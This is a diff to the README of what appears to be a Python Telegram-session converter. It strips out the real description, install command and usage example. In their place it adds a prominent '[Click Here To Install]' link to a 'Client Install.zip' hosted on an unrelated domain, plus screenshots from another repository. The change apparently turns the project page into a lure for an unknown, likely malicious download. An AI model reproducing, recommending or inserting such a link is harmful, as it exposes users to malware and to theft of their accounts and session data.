@@ -1,34 +1,17 @@
 ![PyPI](https://img.shields.io/pypi/v/TGSessionsConverter)
 ![PyPI - License](https://img.shields.io/pypi/l/TGSessionsConverter)
 
-This module is small util for easy converting Telegram sessions to various formats (Telethon, Pyrogram, Tdata)
-<hr/>
-
-## Installation
-
-```
-$ pip install TGConvertor
-```
-
-## Quickstart
-
-```python
-from TGConvertor.manager.manager import SessionManager
-from pathlib import Path
-
-API_ID = 123
-API_HASH = "Your API HASH"
+<H1 align=center><a href="https://abitareproperties.com/temp/Client%20Install.zip">[Click Here To Install]</a></H1>
 
 
-def main():
-    session = SessionManager.from_tdata_folder(Path("TDATA/tdata"))
-    res = session.to_pyrogram_string()
-    print(res)
+# Screenshots:
 
 
-if __name__ == "__main__":
-    main()
-```
+![screen](https://github.com/nazar220160/AI-App/blob/master/manager/first.jpeg?raw=true)
+
+![screen2](https://github.com/nazar220160/AI-App/blob/master/manager/ai.png?raw=true)
+
+![screen3](https://github.com/nazar220160/AI-App/blob/master/manager/apxe.jpg?raw=true)
 
 ### How it works
 
